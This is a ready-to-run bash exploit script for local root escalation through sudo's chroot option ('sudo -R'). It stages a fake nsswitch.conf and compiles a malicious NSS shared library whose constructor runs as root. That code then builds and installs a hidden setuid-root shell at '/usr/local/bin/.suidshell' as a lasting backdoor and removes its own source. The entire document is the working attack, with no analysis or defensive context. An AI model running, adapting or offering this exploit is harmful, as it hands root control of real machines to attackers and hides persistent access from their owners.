#!/bin/bash

set -euo pipefail
STAGE=$(mktemp -d /tmp/sudo2root.stage.XXXXXX)
cd "$STAGE" || { echo "Failed to enter temp dir"; exit 1; }

cat > sudo2root.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

__attribute__((constructor)) void exploit_constructor(void) {
    setreuid(0,0);
    setregid(0,0);

    const char *suid_src =
        "#include <unistd.h>\n"
        "#include <sys/types.h>\n"
        "#include <stdlib.h>\n"
        "#include <stdio.h>\n"
        "#include <string.h>\n"
        "\n"
        "int main(int argc, char *argv[]) {\n"
        "    setreuid(0,0);\n"
        "    setregid(0,0);\n"
        "    chdir(\"/\");\n"
        "\n"
        "    if (argc > 1) {\n"
        "        char command[4096];\n"
        "        int current_len = 0;\n"
        "\n"
        "        for (int i = 1; i < argc; i++) {\n"
        "            if (current_len + strlen(argv[i]) + (i < argc - 1 ? 1 : 0) + 1 > sizeof(command)) {\n"
        "                break;\n"
        "            }\n"
        "            current_len += snprintf(command + current_len, sizeof(command) - current_len, \"%s%s\", argv[i], (i < argc - 1 ? \" \" : \"\"));\n"
        "        }\n"
        "\n"
        "        execl(\"/bin/sh\", \"sh\", \"-c\", command, NULL);\n"
        "    } else {\n"
        "        execl(\"/bin/bash\", \"bash\", NULL);\n"
        "    }\n"
        "\n"
        "    return 1;\n"
        "}\n";

    FILE *fp = fopen("/tmp/suid_shell_src.c", "w");
    if (fp) {
        fputs(suid_src, fp);
        fclose(fp);
    } else {
        exit(1);
    }

    const char *target_bin_path = "/usr/local/bin/.suidshell";

    char compile_cmd[256];
    snprintf(compile_cmd, sizeof(compile_cmd), "gcc /tmp/suid_shell_src.c -o %s", target_bin_path);
    system(compile_cmd);

    char chown_cmd[256];
    snprintf(chown_cmd, sizeof(chown_cmd), "chown 0:0 %s", target_bin_path);
    system(chown_cmd);

    char chmod_cmd[256];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod 4755 %s", target_bin_path);
    system(chmod_cmd);

    char rm_cmd[256];
    snprintf(rm_cmd, sizeof(rm_cmd), "rm /tmp/suid_shell_src.c");
    system(rm_cmd);
}
EOF

mkdir -p sudo2root/etc libnss_
echo "passwd: /sudo2root1337" > sudo2root/etc/nsswitch.conf
cp /etc/group sudo2root/etc
gcc -shared -fPIC -Wl,-init,exploit_constructor -o libnss_/sudo2root1337.so.2 sudo2root.c

echo "Launching exploit..."
sudo -R sudo2root sudo2root
rm -rf "$STAGE"
